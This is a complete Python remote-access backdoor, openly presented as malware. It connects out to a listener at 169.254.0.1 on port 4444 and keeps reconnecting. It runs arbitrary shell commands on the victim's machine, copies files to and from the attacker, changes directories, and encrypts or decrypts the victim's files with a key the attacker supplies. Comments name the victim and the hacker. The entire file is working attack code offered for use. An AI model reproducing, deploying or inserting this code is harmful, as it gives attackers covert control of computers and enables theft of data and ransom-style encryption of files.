
import subprocess, os, socket, time, struct
from cryptography.fernet import Fernet
 
#timeouts for socket
timeout = 3.0
extended_timeout = 60.0

#class for backdoor sockets to connect to listener
class Backdoor:
    #Initilization of Backdoor
    def __init__(self, ip, port) -> None:
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    #responsible for executing commands from listener in cmd and sending output to listener
    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as err:
            return bytes(f"\nerror in command, try again:\n{err}\n", "utf-8")
        except Exception as err:
            return bytes(f"error: {err}", "utf-8")
    
    #responsible for uploading file to hackers's machine 
    def read_file(self, name):
        try:
            self.connection.settimeout(extended_timeout) #extension of timeout
            time.sleep(5) #helps sync
            
            file_size = os.path.getsize(name)
            self.connection.sendall(struct.pack('!Q', file_size))  #sends file size

            #awaits receipent to be ready
            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"ready":
                    break
            
            #sends data in chunks of 4096
            with open(name, "rb") as file:
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)

            self.connection.settimeout(timeout)
            return bytes("file sent from source", 'utf-8')
        except socket.timeout:
            return bytes("socket timed out", 'utf-8')
        except Exception as err:
            return bytes(f"Error occurred during upload: {err}", 'utf-8')
      
    #responsible for controlling directories on victims machine remotely
    def change_working_directory_to(self, path):
        try:
            os.chdir(path) #simply changes directories
            return bytes(f"changed directory to {os.getcwd()}", "utf-8") 
        except FileNotFoundError:
            return bytes(f"Directory not found: {path}", "utf-8")
        except Exception as err:
            return bytes(f"An error occurred: {err}", "utf-8")
       
    #connection.recv() but with extra possibilites taken into consideration
    def reliable_recv(self):
        while True:
            try:
                command = self.connection.recv(2048).decode("utf-8")
                if len(command) == 0:
                    break
                return command, command.split(sep=" ")
            except (ConnectionResetError, BrokenPipeError):
                break
            except socket.timeout:
                continue
            except Exception as err:
                print(err)
                break    
    
    #responsible for downlading file from hackers's machine
    def write_file(self, path):
        try:
            self.connection.settimeout(extended_timeout)
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]
            except Exception as err:
                print(err)
            self.connection.send(b"ready")

            name = os.path.basename(path)
            with open(name, "wb") as file:
                bytes_recieved = 0
                while bytes_recieved < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_recieved))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_recieved += len(chunk)
            
            self.connection.settimeout(timeout)
            return bytes(f"File saved successfully and written to {file.name}", "utf-8")

        except Exception as err:
            return bytes(f"Error occurred: {err}", "utf-8")
    
    #encrypts files using key given by hacker
    def encrypt_file(self, path, key):
        try:
            self.connection.settimeout(extended_timeout)
            cipher = Fernet(key)

            with open(path, 'rb') as file:
                data = file.read()

            enc_data = cipher.encrypt(data)

            enc_file_path = "enc_" + path
            with open(enc_file_path, 'wb') as encrypted_file:
                encrypted_file.write(enc_data)

            self.connection.settimeout(timeout)
            return bytes(f"{enc_file_path} encrypted correctly", "utf-8")
        except Exception as err:
            print(err)
            return bytes(f"An error occurred: {err}", "utf-8")
    
    #decryptes files using key given by hacker
    def decrypt_file(self, path, key):
        try:
            self.connection.settimeout(extended_timeout)
            cipher = Fernet(key)

            with open(path, 'rb') as file:
                data = file.read()

            dec_data = cipher.decrypt(data)

            dec_file_path = "dec_" + path
            with open(dec_file_path, 'wb') as decrypted_file:
                decrypted_file.write(dec_data)

            self.connection.settimeout(timeout)
            return bytes(f"{dec_file_path} decrypted correctly", "utf-8")
        except Exception as err:
            print(err)
       
    #Control of entire Backdoor
    def run(self):
            while True:
                try:
                    command, command_parsed = self.reliable_recv()
                    if command_parsed[0] == "exit":
                        self.connection.close()
                        exit()
                    elif command_parsed[0] == "cd" and len(command) > 1:
                        filepath = command_parsed[1:] #allows for cd into directories with
                        fullpath = ' '.join(filepath) #spaces like C:\Users\username\My Downloads
                        result = self.change_working_directory_to(fullpath)
                    elif command_parsed[0] == "download":
                        result = self.read_file(command_parsed[1])
                    elif command_parsed[0] == "upload":
                        result = self.write_file(command_parsed[1])
                    elif command_parsed[0] == "enc":
                        result = self.encrypt_file(command_parsed[1], command_parsed[2])
                    elif command_parsed[0] == "dec":
                        result = self.decrypt_file(command_parsed[1], command_parsed[2])
                    else:
                        result = self.execute_system_command(command)
                    self.connection.send(result)
                except socket.timeout: 
                    continue

#Ensures backdoor is always available to connect to 
while True:
    try:
        mybackdoor = Backdoor("169.254.0.1", 4444)
        mybackdoor.run()
    except:
        continue
